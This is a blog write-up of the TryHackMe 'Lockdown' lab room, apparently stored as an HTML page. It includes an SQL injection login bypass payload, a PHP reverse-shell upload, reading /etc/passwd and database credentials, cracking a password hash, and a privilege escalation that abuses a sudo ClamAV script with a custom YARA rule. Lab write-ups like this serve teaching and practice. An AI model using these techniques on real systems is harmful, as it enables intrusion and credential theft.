@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Lockdown - THM | Shebu 🔽</title>
+<meta name="keywords" content="sql-injection, file-upload, yara">
+<meta name="description" content="Description Stay at 127.0.0.1. Wear a 255.255.255.0
+Room name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ➜ lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
+<meta name="author" content="Shebu">
+<link rel="canonical" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/">
+<link crossorigin="anonymous" href="/themes/hugo-PaperMod/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/themes/hugo-PaperMod/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/apple-touch-icon.png">
+<link rel="mask-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Lockdown - THM" />
+<meta property="og:description" content="Description Stay at 127.0.0.1. Wear a 255.255.255.0
+Room name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ➜ lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/" />
+<meta property="og:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/lockdown.jpg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-11-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/lockdown.jpg" />
+<meta name="twitter:title" content="Lockdown - THM"/>
+<meta name="twitter:description" content="Description Stay at 127.0.0.1. Wear a 255.255.255.0
+Room name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ➜ lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Lockdown - THM",
+      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Lockdown - THM",
+  "name": "Lockdown - THM",
+  "description": "Description Stay at 127.0.0.1. Wear a 255.255.255.0\nRoom name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ➜ lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.",
+  "keywords": [
+    "sql-injection", "file-upload", "yara"
+  ],
+  "articleBody": "Description Stay at 127.0.0.1. Wear a 255.255.255.0\nRoom name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ➜ lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA) | 256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA) |_ 256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Coronavirus Contact Tracer Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 8 03:56:56 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds Website - Port 80 Add contacttracer.thm to your /etc/hosts file.\nVisiting website at port 80 gives us this simple page of Coronavirus contact tracer.\nThe link to admin panel which lead to /login.php had a login form .\nlogin.php\nsqli auth-bypass I tried simple sqli auth bypass payload like admin' OR 1=1-- and to my surprise I was logged in !\nShell as www-data Browsing through the application I finally reached the settings page which had an upload image functionality .\nI was not sure whether .php file could be uploaded .If not then I would have to rename it to something like shell.php.jpg .\nI first tried uploading php-reverse-shell.php script \u0026 it was succesfully uploaded.\nNow I went back to contacttracer.thm and opened the image in new tab .Make sure to setup nc listener before this.\nThe page keeps on loading which is a good sign that means the reverse shell connected back to our nc listener!\nSo now we are in as www-data .\nShell as cyrus There are 3 users on this machine root,cyrus \u0026 maxine\nwww-data@lockdown:/$ cat /etc/passwd | grep bash cat /etc/passwd | grep bash root❌0:0:root:/root:/bin/bash maxine❌1000:1000:maxine:/home/maxine:/bin/bash cyrus❌1001:1001::/home/cyrus:/bin/bash The /var/www/html directory contained config.php file which had a password hash.\nwww-data@lockdown:/var/www/html$ cat config.php cat config.php \u003c?php session_start(); $dev_data = array('id'=\u003e'-1','firstname'=\u003e'Developer','lastname'=\u003e'','username'=\u003e'dev_oretnom','password'=\u003e'5da283a2***********df5bc0d0','last_login'=\u003e'','date_updated'=\u003e'','date_added'=\u003e''); if(!defined('base_url')) define('base_url','http://contacttracer.thm/'); if(!defined('base_app')) define('base_app', str_replace('\\\\','/',__DIR__).'/' ); if(!defined('dev_data')) define('dev_data',$dev_data); require_once('classes/DBConnection.php'); require_once('classes/SystemSettings.php'); $db = new DBConnection; $conn = $db-\u003econn; function redirect($url=''){ if(!empty($url)) echo ''; } function validate_image($file){ if(!empty($file)){ if(@getimagesize(base_url.$file)){ return base_url.$file; }else{ return base_url.'dist/img/no-image-available.png'; } }else{ return base_url.'dist/img/no-image-available.png'; } Cracked it but was not useful since I couldn’t switch to any of the two users.\nOn further enumeration, /classes directory a file called DBConnection.php had a username \u0026 password for accesing mysql database .\nwww-data@lockdown:/var/www/html/classes$ ls -al ls -al total 52 drwxr-xr-x 2 www-data www-data 4096 May 11 2021 . drwxr-xr-x 11 www-data www-data 4096 May 11 2021 .. -rw-r--r-- 1 www-data www-data 1770 May 11 2021 City.php -rw-r--r-- 1 www-data www-data 653 May 11 2021 DBConnection.php -rw-r--r-- 1 www-data www-data 2811 May 11 2021 Establishment.php -rw-r--r-- 1 www-data www-data 1880 May 11 2021 Login.php -rw-r--r-- 1 www-data www-data 1011 May 11 2021 Main.php -rw-r--r-- 1 www-data www-data 2991 May 11 2021 People.php -rw-r--r-- 1 www-data www-data 1788 May 11 2021 State.php -rw-r--r-- 1 www-data www-data 3606 May 11 2021 SystemSettings.php -rw-r--r-- 1 www-data www-data 4 May 11 2021 TEST.php -rw-r--r-- 1 www-data www-data 2145 May 11 2021 Users.php -rw-r--r-- 1 www-data www-data 1800 May 11 2021 Zone.php www-data@lockdown:/var/www/html/classes$ cat DBConnection.php cat DBConnection.php \u003c?php class DBConnection{ private $host = 'localhost'; private $username = 'cts'; private $password = 'YOUMKtIXoR********9tvq2UdNWE'; private $database = 'cts_db'; public $conn; public function __construct(){ if (!isset($this-\u003econn)) { $this-\u003econn = new mysqli($this-\u003ehost, $this-\u003eusername, $this-\u003epassword, $this-\u003edatabase); if (!$this-\u003econn) { echo 'Cannot connect to database server'; exit; } } } public function __destruct(){ $this-\u003econn-\u003eclose(); } Logging into cts_db database to retreive some juicy info .\nwww-data@lockdown:/var/www/html/classes$ mysql -h localhost -u cts -pYOUMKt**********9tvq2UdNWE -D cts_db mysql: [Warning] Using a password on the command line interface can be insecure. Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 212 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql\u003e mysql\u003e show databases; +--------------------+ | Database | +--------------------+ | information_schema | | cts_db | +--------------------+ 2 rows in set (0.00 sec) mysql\u003e use cts_db; Database changed mysql\u003e show tables; +------------------+ | Tables_in_cts_db | +------------------+ | barangay_list | | city_list | | establishment | | people | | state_list | | system_info | | tracks | | users | +------------------+ 8 rows in set (0.00 sec) mysql\u003e SELECT * FROM users; +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ | id | firstname | lastname | username | password | avatar | last_login | date_added | date_updated | +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ | 1 | Adminstrator | Admin | admin | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 | +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ 1 row in set (0.00 sec) I cracked the password hash using crackstation.net .\nNow we have the password .Lets switch to cyrus user.\nuser.txt 🚩 Grab the user.txt flag !\ncyrus@lockdown:~$ cat user.txt cat user.txt THM{w4c1F5Au********Zyp0QJDIbWS} root.txt 🚩 To get a stable shell , I uploaded my id_rsa.pub key to authorized_keys so that I could SSH into the machine directly .\nThe home directory contained the following -\nA directory called quarentine which had nothing in it. A file called testvirus sudo -l reveals that the user cyrus could run /opt/scan/scan.sh as root !\ncyrus@lockdown:~$ sudo -l [sudo] password for cyrus: Sorry, try again. [sudo] password for cyrus: Matching Defaults entries for cyrus on lockdown: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User cyrus may run the following commands on lockdown: (root) /opt/scan/scan.sh cyrus@lockdown:~$ cat /opt/scan/scan.sh #!/bin/bash read -p \"Enter path: \" TARGET if [[ -e \"$TARGET\" \u0026\u0026 -r \"$TARGET\" ]] then /usr/bin/clamscan \"$TARGET\" --copy=/home/cyrus/quarantine /bin/chown -R cyrus:cyrus /home/cyrus/quarantine else echo \"Invalid or inaccessible path.\" fi The script is executing a binary called clamscan .Time to google what it is.\nClam AntiVirus (ClamAV) is a free software, cross-platform and open-source antivirus software toolkit able to detect many types of malicious software, including viruses.\nSo what the script does is it asks us for a path to a file \u0026 then it scans it using clamscan (anti-virus) and if the file is malicious ,it copies the file to ~/quarentine directory.\nWe had a testvirus file remember? Lets give it as i/p to this script.\ncyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh Enter path: /home/cyrus/testvirus /home/cyrus/testvirus: EICAR_MD5.UNOFFICIAL FOUND /home/cyrus/testvirus: copied to '/home/cyrus/quarantine/testvirus' ----------- SCAN SUMMARY ----------- Known viruses: 1 Engine version: 0.103.2 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.011 sec (0 m 0 s) Start Date: 2021:11:29 11:47:30 End Date: 2021:11:29 11:47:30 Since the file contained certain signatures which were declared as malicious in the clamscan database ,it identified the file as a virus and then sent it to ~/quarentine directory.\nThe database file which identifies virus is located at /var/lib/clamav/main.hdb which contained - 69630e4574ec6798239b091cda43dca0:69:EICAR_MD5 \u0026 so it flagged the testvirus file as malicious one.\nAfter hours of googling , I found out a way to create Yara signature rule of our own to flag a malicious file .\nClamAV can process YARA rules. ClamAV virus database file names ending with .yar or .yara are parsed as YARA rule files\nHow to create rule -\nhttps://docs.clamav.net/manual/Signatures/YaraRules.html https://yara.readthedocs.io/en/stable/writingrules.html So I created a custom signature rule called rule.yara with the below code \u0026 saved it in /var/lib/clamav .\nrule root { strings: $s = \"THM{\" condition: $s } This will flag a file which contains string like THM{ and flags it as a virus ,as a result the file gets stored in ~/quarentine directory.\ncyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh Enter path: /root/root.txt /root/root.txt: YARA.root.UNOFFICIAL FOUND /root/root.txt: copied to '/home/cyrus/quarantine/root.txt' ----------- SCAN SUMMARY ----------- Known viruses: 2 Engine version: 0.103.2 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.006 sec (0 m 0 s) Start Date: 2021:11:29 12:21:13 End Date: 2021:11:29 12:21:13 Success , Grab the root.txt flag !\ncyrus@lockdown:/var/lib/clamav$ cat ~/quarantine/root.txt THM{IQ23Em4V**********W9GZZJxm} ",
+  "wordCount" : "1403",
+  "inLanguage": "en",
+  "image":"https://sh3bu.github.io/themes/hugo-PaperMod/img/lockdown.jpg","datePublished": "2021-11-27T00:00:00Z",
+  "dateModified": "2021-11-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Shebu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Shebu 🔽",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://sh3bu.github.io/themes/hugo-PaperMod" accesskey="h" title="Shebu 🔽 (Alt + H)">Shebu 🔽</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://sh3bu.github.io/themes/hugo-PaperMod">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Lockdown - THM
+    </h1>
+    <div class="post-meta"><span title='2021-11-27 00:00:00 +0000 UTC'>November 27, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Shebu
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="lazy" srcset="https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown_hube1beabf7afdf44d3249308cd3de7b74_191850_360x0_resize_q75_box.jpg 360w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown_hube1beabf7afdf44d3249308cd3de7b74_191850_480x0_resize_q75_box.jpg 480w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown_hube1beabf7afdf44d3249308cd3de7b74_191850_720x0_resize_q75_box.jpg 720w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown_hube1beabf7afdf44d3249308cd3de7b74_191850_1080x0_resize_q75_box.jpg 1080w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown.jpg 1200w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/img/lockdown.jpg" alt="Lockdown - THM" 
+            width="1200" height="628">
+        <p>Lockdown - THM</p>
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#description" aria-label="Description">Description</a></li>
+                <li>
+                    <a href="#enumeration" aria-label="Enumeration">Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#portscan" aria-label="Portscan">Portscan</a></li>
+                <li>
+                    <a href="#website---port-80" aria-label="Website - Port 80">Website - Port 80</a></li>
+                <li>
+                    <a href="#sqli-auth-bypass" aria-label="sqli auth-bypass">sqli auth-bypass</a></li></ul>
+                </li>
+                <li>
+                    <a href="#shell-as-www-data" aria-label="Shell as www-data">Shell as www-data</a></li>
+                <li>
+                    <a href="#shell-as-cyrus" aria-label="Shell as cyrus">Shell as cyrus</a><ul>
+                        
+                <li>
+                    <a href="#usertxt-" aria-label="user.txt 🚩">user.txt 🚩</a></li></ul>
+                </li>
+                <li>
+                    <a href="#roottxt-" aria-label="root.txt 🚩">root.txt 🚩</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h1>
+<hr>
+<p>Stay at 127.0.0.1. Wear a 255.255.255.0</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>Room name</strong></th>
+<th>Lockdown</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>OS</strong></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>Difficulty</strong></td>
+<td>Medium</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>Room Link</strong></td>
+<td><a href="https://tryhackme.com/room/lockdown">https://tryhackme.com/room/lockdown</a></td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>Creator</strong></td>
+<td><a href="https://tryhackme.com/p/hangrymoose">hangrymoose</a></td>
+</tr>
+</tbody>
+</table>
+<h1 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h1>
+<hr>
+<h2 id="portscan">Portscan<a hidden class="anchor" aria-hidden="true" href="#portscan">#</a></h2>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.91 scan initiated Mon Nov  8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.252.58
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.35s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> filtered ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Coronavirus Contact Tracer
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Mon Nov  8 03:56:56 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds</span>
+</span></span></code></pre></div><h2 id="website---port-80">Website - Port 80<a hidden class="anchor" aria-hidden="true" href="#website---port-80">#</a></h2>
+<hr>
+<p>Add <code>contacttracer.thm</code> to your <code>/etc/hosts</code> file.</p>
+<p>Visiting website at port 80 gives us this simple page of Coronavirus contact tracer.</p>
+<p><img loading="lazy" src="img/website1.png#center" alt="website1"  />
+</p>
+<p>The link to admin panel which lead  to  <code>/login.php</code> had a login form .</p>
+<p><img loading="lazy" src="img/login.png#center" alt="login"  />
+</p>
+<p><em>login.php</em></p>
+<h2 id="sqli-auth-bypass">sqli auth-bypass<a hidden class="anchor" aria-hidden="true" href="#sqli-auth-bypass">#</a></h2>
+<hr>
+<p>I tried simple sqli auth bypass payload like <code>admin' OR 1=1-- </code> and to my surprise I was logged in !</p>
+<p><img loading="lazy" src="img/website2.png#center" alt="website2"  />
+</p>
+<h1 id="shell-as-www-data">Shell as www-data<a hidden class="anchor" aria-hidden="true" href="#shell-as-www-data">#</a></h1>
+<hr>
+<p>Browsing through the application I finally reached the settings page which had an <code>upload image functionality</code> .</p>
+<p><img loading="lazy" src="img/upload.png#center" alt="upload"  />
+</p>
+<p>I was not sure whether .php file could be uploaded .If not then I would have to rename it to something like shell.php.jpg .</p>
+<p>I first tried uploading <code>php-reverse-shell.php</code> script &amp; it was succesfully uploaded.</p>
+<p>Now I went back to <code>contacttracer.thm</code> and opened the image in new tab .Make sure to setup nc listener before this.</p>
+<p><img loading="lazy" src="img/website3.png#center" alt="website3"  />
+</p>
+<p><img loading="lazy" src="img/website4.png#center" alt="website4"  />
+</p>
+<p>The page keeps on loading which is a good sign that means the reverse shell connected back to our nc listener!</p>
+<p><img loading="lazy" src="img/revshell.png#center" alt="revshell"  />
+</p>
+<p>So now we are in as <code>www-data</code> .</p>
+<h1 id="shell-as-cyrus">Shell as cyrus<a hidden class="anchor" aria-hidden="true" href="#shell-as-cyrus">#</a></h1>
+<hr>
+<p>There are 3 users on this machine <code>root</code>,<code>cyrus</code> &amp; <code>maxine</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@lockdown:/$ cat /etc/passwd <span class="p">|</span> grep bash
+</span></span><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> grep bash
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">maxine❌1000:1000:maxine:/home/maxine:/bin/bash
+</span></span><span class="line"><span class="cl">cyrus❌1001:1001::/home/cyrus:/bin/bash
+</span></span></code></pre></div><p>The <code>/var/www/html</code> directory contained <code>config.php</code> file which had a password hash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@lockdown:/var/www/html$ cat config.php
+</span></span><span class="line"><span class="cl">cat config.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">session_start<span class="o">()</span><span class="p">;</span>
